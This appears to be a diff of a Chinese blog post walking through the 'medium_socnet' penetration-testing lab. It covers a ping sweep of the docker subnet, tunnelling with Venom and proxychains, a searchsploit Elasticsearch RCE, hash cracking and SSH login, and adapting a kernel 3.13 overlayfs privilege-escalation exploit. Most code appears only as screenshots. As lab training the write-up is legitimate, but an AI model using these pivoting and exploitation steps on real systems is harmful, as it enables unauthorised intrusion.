+<p><font style="color:rgb(77, 77, 77);">除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在&#x2F;proc下，以进程的 PID号为目录名，它们是读取进程信息的接口。而self目录则是读取进程本身的信息接口，是一个link。</font></p>
+</blockquote>
+<h2 id="突破docker容器"><a href="#突破docker容器" class="headerlink" title="突破docker容器"></a>突破docker容器</h2><h3 id="查看ip地址"><a href="#查看ip地址" class="headerlink" title="查看ip地址"></a>查看ip地址</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726830246530-8f429db7-dfd2-487a-8323-76191e64ce63.png"></p>
+<p>我们可以将这个172的网段视为这个网络中的内网。</p>
+<p>我们可以进一步在内网网段中进行主机发现，以及它们是否存在已知漏洞呢，从而获取更多的信息。</p>
+<h3 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h3><p>for i in $(seq 1 255);do ping -c 1 -W 1 172.17.0.$i;done</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726832148883-7531695d-fab9-4c96-a404-0eb8a218b315.png"></p>
+<p>发现1和2是开的。</p>
+<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>我们是要用kali的各种工具来进行攻击的，现在kali都不在内网中，我们现在要打通内网。</p>
+<p>隧道建立来实现，基于隧道来代理。</p>
+<p>工具：Venom</p>
+<p>我们需要将这个工具的客户端传到客户端的系统上。然后kali启动服务端。</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726837586777-5119cead-fbcb-46c4-97b2-595014bf25a8.png"></p>
+<p>由于对方是linux系统，所以这里我们传agen_linux_x64。</p>
+<p>kali本机开启htpp服务，对方下载。</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726837411743-8e3331c1-4d5b-425e-85a2-f295f4ffd669.png"></p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726837779463-d4b4bf7f-4e30-48d3-8835-7ded2c724ee7.png"></p>
+<p>准备好了后，kali先用服务端监听，然后客户端连接</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726837927171-fb8f8051-162b-47bf-9a0b-fd8b8cfabcf0.png"></p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726838068578-971dcf52-68b6-4125-8efd-4716b169e6b3.png"></p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726838092403-0ae6bb78-69e6-4cbc-97fd-4b1c06e24cac.png"></p>
+<p>这个1代表一个节点。</p>
+<p>我们进入第一个节点，并用socks监听一个端口：</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726838215498-edaf5e96-796b-4723-8493-9d644ae36487.png"></p>
+<p>此时我们就在服务端开启了一个1080端口的代理。</p>
+<p>接下来，让所有的工具都走这个代理，用proxychains</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726838809680-95176136-2bd1-4d5a-afda-39edf5e41300.png"></p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726838830231-90d63b15-d4ef-4f99-ad8c-4f87edfe6f44.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726838897350-922288bb-2c83-4deb-ab5a-d1d1307f378c.png"></p>
+<p>发现跟之前的一模一样。</p>
+<p>访问一下网页，之前那个结果在这里也有，那我可可以判断出，这个172.0.0.1就是之前的映射的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839200697-47c94eff-0b38-4161-894d-1be6b7c90a6a.png"></p>
+<p>我们继续探测2</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726839336713-cf2fa262-da43-4ad5-91c4-df0149c3382f.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839388049-e9068aed-0c48-462a-a12e-0ec478080d6a.png"></p>
+<h3 id="漏洞检测利用"><a href="#漏洞检测利用" class="headerlink" title="漏洞检测利用"></a>漏洞检测利用</h3><p>我们可以直接在kali上搜索有关Elasticsearch的相关漏洞信息。</p>
+<p>命令：searchsploit</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839589239-b69bb733-7df2-4b4f-b78a-e070f6b16db6.png"></p>
+<p>我们可以直接用后面给的路径中的工具&#x2F;代码。</p>
+<p>我们对rce比较感兴趣，尝试这两个。</p>
+<p>先查看一下代码：</p>
+<p><img src="/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/1726839805246-69a04011-7f51-4c09-b957-23a30d2211cc.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839830398-02b300b5-c806-4ab7-9fd3-4078eb81292c.png"></p>
+<p>可以看到是用python2执行的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839860027-9ff74866-89da-4966-a329-ba5fd0b73075.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839874396-7fd101fc-5620-498e-b178-3b3331599672.png"></p>
+<p>用法下面也给我们了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839932584-95451521-5d03-40aa-861b-ba7f4aa76e4f.png"></p>
+<p>再次拿到root权限了，不过还是docker的。</p>
+<p>我们继续进行信息收集，发现了一个敏感的文件，查看一下</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726839978966-49e663a9-e77e-4c75-babd-f6f064a437e7.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840021951-29580041-aa1c-4ef3-99e1-a2ad39c161b8.png"></p>
+<p>有很敏感的信息，我们接下来爆破hash</p>
+<h3 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a>爆破hash</h3><p>爆破之前，最好先去网上找找有没有直接现成的：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840190565-4a5d32bc-e048-4817-97c0-dc576d355831.png"></p>
+<p>直接有，这是root的。</p>
+<p>账号密码如何登陆呢？</p>
+<p>当然是哪些开放了22端口的机子。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840326559-d21e5d3e-0f27-48b4-bb86-06b8847c8d15.png"></p>
+<p>结果root登陆不上。尝试其他的：</p>
+<p>经过测试，只有john能登陆上：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840568720-aac07742-b073-457f-9d45-ef42ed634d65.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="权限检测"><a href="#权限检测" class="headerlink" title="权限检测"></a>权限检测</h3><p>查看一下权限，无果。那john就是一个普通用户。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840699955-65692927-2d6c-4384-bf27-ca7b603ba287.png"></p>
+<p>那就的尝试内核漏洞提权了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840811310-01f18959-8bd9-40ec-894c-6c90ee56174e.png"><br>可以看到，对方内核是3.13版本（<strong>也可以uname -a</strong>）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726840883150-e9a5fbfc-3ba9-478b-a6c0-53c3998635af.png"></p>
+<p>这是一个很老的版本了，现在都五点几了。</p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>同样还是工具searchsploit</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841043731-e17b9af3-574a-4f3e-958e-e8aaa2916f50.png"></p>
+<p>发现有很多可以用的，随便用一个，实战中可能要挨个尝试：</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841175066-e621ea59-c80d-4187-b091-cca939ab6985.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841188771-435a5772-e800-4344-bb3e-85c8a11b3fce.png"></p>
+<p>从后缀名也能看出来这是个c文件，要想使用，得先用gcc编译。</p>
+<p>对方没有gcc我们还得本地编译上传过去。</p>
+<p>在使用某个文件前，最好先看一下文件内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841480260-5e4aa179-e856-4e9e-80e9-c5c92664d9d4.png"></p>
+<p>发现，里面居然又执行了gcc，而对方没有gcc。这条命令生成的文件&#x2F;tmp&#x2F;ofs-lib.so在前面也有利用。这样显然会出问题。</p>
+<p>解决这个问题最容易实现的方法是修改这个代码：</p>
+<p>这句出问题的代码逻辑是：用&#x2F;tmp&#x2F;ofs-lib.c生成&#x2F;tmp&#x2F;ofs-lib.so这个库文件。</p>
+<p>我们可以直接在本地生成这个so，然后传上去，当对方执行到这里时，直接就用这个文件了，无需生成。</p>
+<p>修改之前：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841915536-911145b1-c2ce-4067-9116-a551a83aded9.png"></p>
+<p>修改后：把设计编译库文件的代码都删掉</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726841967103-46aae682-6cbb-4e50-bd9b-8e40e50479bd.png"></p>
+<p>编译：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842119602-d807c7e9-b980-47a7-9908-bd0048bebb26.png"></p>
+<p>过程会报一些错，但不影响执行。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842175126-d8980fe9-6d44-4580-a365-54c09ff0b174.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842246409-0e0367d9-0d49-4005-81b7-5a7559e799fd.png"></p>
+<p>现在将这两个文件一起上传上去。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842597240-8c3caa3c-b8a4-4e4c-ba09-907e8383de7b.png"></p>
+<p>为了执行的成功，我们将文件放到&#x2F;tmp目录下：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842683775-322950b6-b71d-4ec0-ab78-8b66208d15de.png"></p>
+<p>正常执行完成后就拿到root权限了，但我们这里缺了东西，导致执行失败了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/42899545/1726842763169-539d8ec4-c87b-449c-9524-3f49c14cb47e.png"></p>
 
       
 
@@ -286,7 +424,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://blog.warrenli.fun/categories/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/2.SQL%E6%B3%A8%E5%85%A5+nc%E5%BC%B9shell%E6%8A%80%E5%B7%A7+nc%E4%BC%A0%E6%96%87%E4%BB%B6+sqlite3%E5%B7%A5%E5%85%B7+hydra%E5%A4%9A%E4%B8%AA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%9A%84ssh%E7%88%86%E7%A0%B4.html" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://blog.warrenli.fun/2025/04/02/1.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8FVenom+searchsploit%E6%90%9C%E6%BC%8F%E6%B4%9E+%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%EF%BC%9Amedium_socnet/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -298,6 +436,25 @@
 </article>
 
   
+<nav id="article-nav">
+  
+    <a href="/2025/04/02/linux%E4%B8%89%E5%89%91%E5%AE%A2/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          linux三剑客
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/04/02/%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6%E5%92%8C&%E7%AC%A6%E5%8F%B7%E9%85%8D%E5%90%88/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">重定向符和&amp;符号配合</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -319,7 +476,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">网页分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE"><span class="toc-number">4.</span> <span class="toc-text">敏感文件查找</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8nc%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">利用nc传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlite3%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">sqlite3工具使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%88%86%E7%A0%B4%E2%80%93hydra"><span class="toc-number">7.</span> <span class="toc-text">ssh爆破–hydra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">提权</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E4%B8%8E%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">主机发现与端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E9%A1%B5%E9%9D%A2%E8%AE%BF%E9%97%AE"><span class="toc-number">2.</span> <span class="toc-text">http页面访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">继续分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AA%81%E7%A0%B4docker%E5%AE%B9%E5%99%A8"><span class="toc-number">5.</span> <span class="toc-text">突破docker容器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bip%E5%9C%B0%E5%9D%80"><span class="toc-number">5.1.</span> <span class="toc-text">查看ip地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">5.2.</span> <span class="toc-text">内网主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">5.3.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8"><span class="toc-number">5.4.</span> <span class="toc-text">漏洞检测利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash"><span class="toc-number">5.5.</span> <span class="toc-text">爆破hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%A3%80%E6%B5%8B"><span class="toc-number">6.1.</span> <span class="toc-text">权限检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
@@ -361,7 +518,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
